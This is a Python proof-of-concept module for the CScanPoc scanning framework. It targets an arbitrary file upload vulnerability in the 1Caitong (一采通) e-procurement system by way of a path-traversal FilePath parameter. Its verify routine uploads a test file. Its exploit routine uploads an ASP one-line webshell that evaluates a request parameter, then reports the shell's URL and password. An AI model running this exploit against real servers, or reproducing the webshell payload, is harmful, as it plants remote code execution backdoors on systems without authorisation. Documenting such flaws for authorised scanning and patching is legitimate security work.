# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = '1Caitong_0010'  # 平台漏洞编号，留空
    name = '一采通电子采购系统任意文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2015-11-12'  # 漏洞公布时间
    desc = '''
        一采通电子采购系统 /Comm/UploadFile/webUpload.aspx?AttId=test.cer&FilePath=/../web/ 任意文件上传漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0131973'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '1Caitong(一采通)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '96b32a31-5f7c-47bf-9c58-4f5175f67f93'
    author = '国光'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vun_url = arg+"/Comm/UploadFile/webUpload.aspx?AttId=9d37b73795649038.cer&FilePath=/../web/"
            data = '''
                ------WebKitFormBoundarySi7aFG5fhvI14Vbv
                Content-Disposition: form-data; name="__VIEWSTATE"
                /wEPDwUJLTkxNTA4NDgxZGT4FQnTj63sW6bItFI88C2Fes3jcRPos/LRQn4yOHqiRw==
                ------WebKitFormBoundarySi7aFG5fhvI14Vbv
                Content-Disposition: form-data; name="fa"; filename="9d37b73795649038.cer"
                Content-Type: application/x-x509-ca-cert
                testvul
                ------WebKitFormBoundarySi7aFG5fhvI14Vbv--
                '''
            r = requests.post(vun_url, data=data)
            res = r.text
            verify_url = arg+"9d37b73795649038.cer"
            if r.status_code == 200 and "9d37b73795649038.cer" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n在该验证过程中上传了文件地址为:{url},请及时删除。'.format(
                    target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vun_url = arg+"/Comm/UploadFile/webUpload.aspx?AttId=9d37b73795649038.cer&FilePath=/../web/"
            data = '''
                ------WebKitFormBoundarySi7aFG5fhvI14Vbv
                Content-Disposition: form-data; name="__VIEWSTATE"
                /wEPDwUJLTkxNTA4NDgxZGT4FQnTj63sW6bItFI88C2Fes3jcRPos/LRQn4yOHqiRw==
                ------WebKitFormBoundarySi7aFG5fhvI14Vbv
                Content-Disposition: form-data; name="fa"; filename="9d37b73795649038.cer"
                Content-Type: application/x-x509-ca-cert
                <%eval request("c")%>
                ------WebKitFormBoundarySi7aFG5fhvI14Vbv--
                '''
            r = requests.post(vun_url, data=data)
            res = r.text
            verify_url = arg+"9d37b73795649038.cer"
            if r.status_code == 200:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n已上传webshell地址:{url}密码为c,请及时删除。'.format(
                    target=self.target, name=self.vuln.name, url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
